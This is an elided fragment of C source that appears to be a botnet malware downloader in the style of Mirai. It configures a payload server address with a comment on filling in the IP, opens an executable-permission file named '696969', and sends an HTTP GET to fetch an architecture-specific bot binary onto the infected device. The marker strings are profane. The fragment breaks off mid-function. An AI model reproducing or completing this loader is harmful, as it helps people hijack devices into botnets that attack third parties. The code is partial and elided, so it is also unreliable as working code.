...
#define HTTP_SERVER utils_inet_addr(127,0,0,1) //Ip goes with commas
#define EXEC_MSG            "fuck\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "you\n"
...
inline void run(void)
{
    ...
    ffd = open("696969", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /fuc/" BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
